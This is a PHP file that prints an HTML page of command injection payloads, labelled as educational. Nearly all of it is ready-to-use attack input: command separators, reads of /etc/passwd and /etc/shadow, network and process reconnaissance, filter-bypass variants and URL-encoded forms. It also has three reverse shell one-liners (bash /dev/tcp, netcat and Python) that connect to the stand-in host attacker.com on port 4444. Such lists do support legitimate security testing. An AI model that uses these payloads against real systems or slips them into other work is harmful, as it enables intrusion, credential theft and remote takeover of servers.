<?php
// Command Injection Payload Collection
// For educational purposes only - Use in controlled testing environments

echo "<!DOCTYPE html>";
echo "<html><head><title>Command Injection Payloads</title>";
echo "<style>";
echo "body { font-family: Arial, sans-serif; background: #1a1a1a; color: #00ff00; padding: 20px; }";
echo ".container { max-width: 800px; margin: 0 auto; background: #2a2a2a; padding: 20px; border-radius: 10px; border: 1px solid #00ff00; }";
echo ".payload { background: #000; padding: 15px; border-radius: 5px; margin: 10px 0; font-family: monospace; border-left: 3px solid #ff4444; }";
echo ".warning { background: #ff4444; color: white; padding: 10px; border-radius: 5px; margin: 10px 0; }";
echo "</style></head><body>";

echo "<div class='container'>";
echo "<h1>🚨 Command Injection Payloads</h1>";
echo "<div class='warning'><strong>⚠️ WARNING:</strong> This is a demonstration payload for educational purposes only. Use only in controlled testing environments.</div>";

echo "<h2>Basic Command Injection:</h2>";
echo "<div class='payload'>; ls -la</div>";
echo "<div class='payload'>| whoami</div>";
echo "<div class='payload'>`id`</div>";
echo "<div class='payload'>$(whoami)</div>";

echo "<h2>Command Separators:</h2>";
echo "<div class='payload'>; ls -la</div>";
echo "<div class='payload'>&& ls -la</div>";
echo "<div class='payload'>|| ls -la</div>";
echo "<div class='payload'>| ls -la</div>";
echo "<div class='payload'>& ls -la</div>";

echo "<h2>File System Commands:</h2>";
echo "<div class='payload'>; cat /etc/passwd</div>";
echo "<div class='payload'>; cat /etc/shadow</div>";
echo "<div class='payload'>; ls -la /home</div>";
echo "<div class='payload'>; find / -name '*.conf' 2>/dev/null</div>";

echo "<h2>Network Commands:</h2>";
echo "<div class='payload'>; netstat -tuln</div>";
echo "<div class='payload'>; ss -tuln</div>";
echo "<div class='payload'>; ifconfig</div>";
echo "<div class='payload'>; ip addr</div>";

echo "<h2>Process Commands:</h2>";
echo "<div class='payload'>; ps aux</div>";
echo "<div class='payload'>; top -n 1</div>";
echo "<div class='payload'>; pstree</div>";

echo "<h2>Reverse Shell Payloads:</h2>";
echo "<div class='payload'>; bash -i >& /dev/tcp/attacker.com/4444 0>&1</div>";
echo "<div class='payload'>; nc -e /bin/bash attacker.com 4444</div>";
echo "<div class='payload'>; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'</div>";

echo "<h2>Windows Command Injection:</h2>";
echo "<div class='payload'>& dir</div>";
echo "<div class='payload'>& whoami</div>";
echo "<div class='payload'>& ipconfig</div>";
echo "<div class='payload'>& netstat -an</div>";
echo "<div class='payload'>& type C:\\Windows\\System32\\drivers\\etc\\hosts</div>";

echo "<h2>Bypass Techniques:</h2>";
echo "<div class='payload'>; l\\s -la</div>";
echo "<div class='payload'>; l's' -la</div>";
echo "<div class='payload'>; l${IFS}s${IFS}-la</div>";
echo "<div class='payload'>; l%0As%0A-la</div>";

echo "<h2>URL Encoded Payloads:</h2>";
echo "<div class='payload'>%3B%20ls%20-la</div>";
echo "<div class='payload'>%7C%20whoami</div>";
echo "<div class='payload'>%60id%60</div>";

echo "<p><em>This file demonstrates various command injection payloads that can be used for testing web application security.</em></p>";
echo "</div></body></html>";
?>
